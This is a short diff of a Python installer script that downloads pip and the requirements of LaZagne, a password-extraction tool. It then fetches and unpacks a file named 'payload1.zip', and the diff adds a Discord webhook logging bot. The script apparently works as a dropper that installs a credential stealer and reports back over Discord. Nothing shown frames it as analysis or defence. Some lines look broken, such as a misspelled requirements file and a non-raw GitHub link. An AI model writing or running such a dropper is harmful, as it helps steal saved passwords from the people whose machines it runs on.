@@ -10,9 +10,11 @@ log("started installer")
 Download("https://bootstrap.pypa.io/get-pip.py", "get-pip.py") # Downloading pip
 Download("https://github.com/AlessandroZ/LaZagne/blob/master/requirements.txt")
 os.system("pip install -r requirements.txt")
-log("install pip")
 os.system("python3 get-pip.py")              # Install pip
 os.system("pip install -r requierments.txt") # Install requierments
+os.system("pip install discord_webhook")
+from logging_bot import log
+log("requirements installed, installer started")
 log("download payload")
 Download(download_link, "payload1.zip")
 os.system("tar -xf payload1.zip") # extract payload
